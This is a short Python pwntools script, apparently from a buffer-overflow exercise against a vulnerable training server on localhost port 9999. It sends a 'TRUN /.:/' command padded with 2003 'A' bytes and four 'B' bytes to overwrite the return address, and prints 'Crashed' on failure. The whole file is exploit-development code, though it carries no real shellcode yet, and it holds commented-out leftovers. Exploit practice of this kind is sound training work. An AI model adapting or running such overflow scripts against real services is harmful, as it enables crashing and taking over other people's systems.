#!/bin/python3

from time import sleep
from termcolor import colored
from pwn import *

context.log_level = 'error'

shellcode = "A" * 2003 + "B" * 4

try:
    # s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # s.connect(('127.0.0.1, 9999')) 
     # s.send(('TRUN /.:/' + buffer).encode())
    s = remote('127.0.0.1', 9999)
    s.sendline(('TRUN /.:/' + shellcode).encode())
    s.close()
        #print(colored("[!]",'green'), "Curret buffer length:" + colored({},'red').format(len(buffer)), "bytes")
except:
    print("Crashed")
    sys.exit()
